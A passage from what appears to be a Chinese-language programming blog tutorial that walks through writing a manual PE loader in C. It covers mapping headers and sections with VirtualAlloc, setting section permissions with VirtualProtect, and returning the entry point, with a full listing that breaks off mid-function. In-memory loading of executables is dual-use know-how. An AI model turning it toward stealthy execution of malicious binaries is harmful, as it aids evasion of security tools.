&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_DOS_header&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">e_lfanew&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// extract information from PE header
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfImage&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">entry_point_RVA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfEntryPoint&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfHeaders&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>先提取了 DOS 文件头和 NT 文件头（注意， File Header 和 Optional Header 都嵌在 NT 文件头结构里，这就是为啥我说结构定义会和上面的 wiki 图不大一样）。接着从文件头结构里取镜像大小、入口点RVA、文件头总大小，用于后续分配内存和指针运算。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c"> &lt;span class="c1">// allocate memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">VirtualAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_of_image&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MEM_RESERVE&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">MEM_COMMIT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READWRITE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>紧接着用 Win32 API 分配了一片内存空间，大小由 PE 文件头的镜像大小指定。用这个API的原因是之后我们需要设置这片内存为可执行。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c"> &lt;span class="c1">// copy PE headers in memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_of_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>PE文件头总是在镜像基址开始的位置，直接复制过去。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c"> &lt;span class="c1">// Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">sections&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>取巧的方式获得节表指针。这是个简单的c指针运算，&lt;code>p_NT_headers+1&lt;/code>其实就是&lt;code>(char*)p_NT_headers + sizeof(IMAGE_NT_HEADERS)&lt;/code>，也就是NT_HEADERS 结构紧邻的下一个字节。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">FileHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfSections&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// calculate the VA we need to copy the content, from the RVA
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// section[i].VirtualAddress is a RVA, mind it
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// check if there is Raw data to copy
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">PointerToRawData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Misc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VirtualSize&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着就是遍历节表，取节的基地址，PE文件中节包含数据的话，就复制节数据到内存，否则把节初始化为0。&lt;/p>
&lt;p>接着补充可执行权限。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c"> &lt;span class="c1">// Set permission for the PE hader to read only
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">oldProtect&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">VirtualProtect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfHeaders&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READONLY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">oldProtect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">FileHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfSections&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">s_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Characteristics&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// flags are not the same between virtal protect and the section header
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_EXECUTE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_WRITE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nl">PAGE_EXECUTE_READWRITE&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">PAGE_EXECUTE_READ&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_WRITE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nl">PAGE_READWRITE&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">PAGE_READONLY&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">VirtualProtect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Misc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VirtualSize&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v_perm&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">oldProtect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>先把整个PE头设置为只读，然后遍历节表，取节基地址和标志位。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_EXECUTE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_WRITE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nl">PAGE_EXECUTE_READWRITE&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">PAGE_EXECUTE_READ&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>根据PE头中节的可写、可执行标志位，设置内存空间保护方式。&lt;/p>
&lt;p>最后返回入口点地址，在 main 函数里跳转。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c"> &lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">entry_point_RVA&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>完整代码如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;Windows.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;winnt.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;missing path argument&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">exe_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="s">&amp;#34;rb&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;error opening file&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Get file size : put pointer at the end
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">fseek&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0L&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SEEK_END&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// and read its position
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">file_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ftell&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// put the pointer back at the beginning
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">fseek&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0L&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SEEK_SET&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// allocate memory and read the whole file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">exe_file_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file_size&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// read whole file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">n_read&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file_data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file_size&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">exe_file&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">n_read&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">file_size&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;reading error (%d)&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">n_read&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// load the PE in memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Loading PE file&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">load_PE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_DOS_header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_DOS_header&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">e_lfanew&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// extract information from PE header
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfImage&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">entry_point_RVA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfEntryPoint&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfHeaders&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// allocate memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">VirtualAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_of_image&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MEM_RESERVE&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">MEM_COMMIT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READWRITE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// copy PE headers in memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_of_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">sections&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">FileHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfSections&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// calculate the VA we need to copy the content, from the RVA
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// section[i].VirtualAddress is a RVA, mind it
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// check if there is Raw data to copy
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">PointerToRawData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
